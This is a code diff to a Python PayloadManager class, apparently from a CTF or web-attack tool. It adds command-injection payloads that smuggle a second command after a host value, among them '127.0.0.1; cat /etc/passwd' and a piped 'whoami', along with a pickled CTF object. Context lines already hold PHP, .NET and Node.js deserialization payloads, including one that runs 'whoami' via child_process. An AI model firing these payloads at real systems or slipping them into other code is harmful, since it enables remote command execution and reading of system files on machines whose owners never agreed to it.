@@ -165,7 +165,12 @@ class PayloadManager:
             # 2025: Deserialization attacks
             'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
             # 2025: Race condition trigger
-            "CONCURRENT_REQUEST_" + str(random.randint(1, 1000))
+            "CONCURRENT_REQUEST_" + str(random.randint(1, 1000)),
+            # 2025: Command Injection with Host Prefix (FileShare)
+            "127.0.0.1 | whoami",
+            "127.0.0.1; cat /etc/passwd",
+            "127.0.0.1 && dir",
+            "127.0.0.1 & echo flag_cmd",
         ]
         
         # 2025: Supply Chain Attack Payloads
@@ -194,6 +199,9 @@ class PayloadManager:
             'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0=',
             # Node.js
             '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\')}()"}',
+            # CTF Specific Pickle (E-Commerce)
+            # Helper to generate: key for 'flag_payload'
+            b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94\x8c\x08username\x94\x8c\x0cflag_payload\x94sb.'.decode('latin1'),
         ]
         
         # 2025: Cryptographic Failures (OWASP A04)
